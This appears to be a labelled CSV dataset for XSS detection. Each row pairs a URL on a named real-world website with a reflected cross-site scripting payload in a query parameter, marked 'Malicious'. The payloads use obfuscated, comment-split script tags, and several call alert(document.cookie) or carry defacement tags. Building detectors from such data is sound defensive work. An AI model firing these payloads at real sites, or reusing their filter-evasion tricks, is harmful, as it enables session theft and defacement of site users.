Payloads,Class
http://icliverpool.icnetwork.co.uk/search.cfm?query=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`/xss%20-%20thedefaced.or<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>g/`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3cp,Malicious
http://www.hyd.ncku.edu.tw/news.php?id=%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%281337%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.ldc.upenn.edu/search/index.php?q=%22%22%3e%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c%3c<!--Comment-->img+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3c<!--Comment-->%3cimg+%22%22%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>fxss%2f%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%27%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28document.domain%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.mjmedya.net/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`document.cook<br<!--Comment-->><br<!--Comment-->>ie`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3eby%20st@rext%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e,Malicious
http://de.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c/s<br<!--Comment-->>cript%3e%3c/s<br<!--Comment-->>cript%3e|--%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h3%3e%3c<!--Comment-->h3%3exss%20by%20xados%3ch3<!--Comment-->%3e%3ch3<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c<!--Comment-->/marquee%3e,Malicious
http://ibuildapp.com/projects.php?filter=iphone&amp;searchtext=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28document.cookie<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%29%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e&amp;searchcat=-1&amp;page=1,Malicious
http://www.hksuiren.gr.jp/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%27ins%20<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>-%20unkn0wn.eu%27%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://woman.msn.co.kr/board/notice_view.asp?n_code=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marqu<br>ee<!--Comment-->&gt;&lt;<!--Comment-->marqu<br>ee&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.ick.net/myred/register.php?do=register2&amp;domainname=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/scri<br<!--Comment-->>pt&gt;&lt;/scri<br>pt<!--Comment-->&gt;&amp;ext=ick.net,Malicious
http://site.ikaka.com/aspx/search.aspx?kw=%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%286%29%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%2fmarqu<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ee%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3esafelab%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->%2fmarquee%3e%3c<!--Comment-->%2fmarquee%3e%3c<!--Comment-->%2fmarquee%3e%3c<!--Comment-->%2fmarquee%3e%3c%2fmarquee<!--Comment-->%3e%3c%2fmarquee<!--Comment-->%3e%3c%2fmarquee<!--Comment-->%3e%3c%2fmarquee<!--Comment-->%3e,Malicious
http://www.killersites.com/mvnforum/mvnforum/rss?forum=14&amp;sort=threadlastpostdate&amp;order=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;al<br<!--Comment-->><br<!--Comment-->>ert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.ipaqservisi.com/site/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`&quot;backdoor&quot;`&lt;/script<br<!--Comment-->>&gt;&lt;/script<br<!--Comment-->>&gt;,Malicious
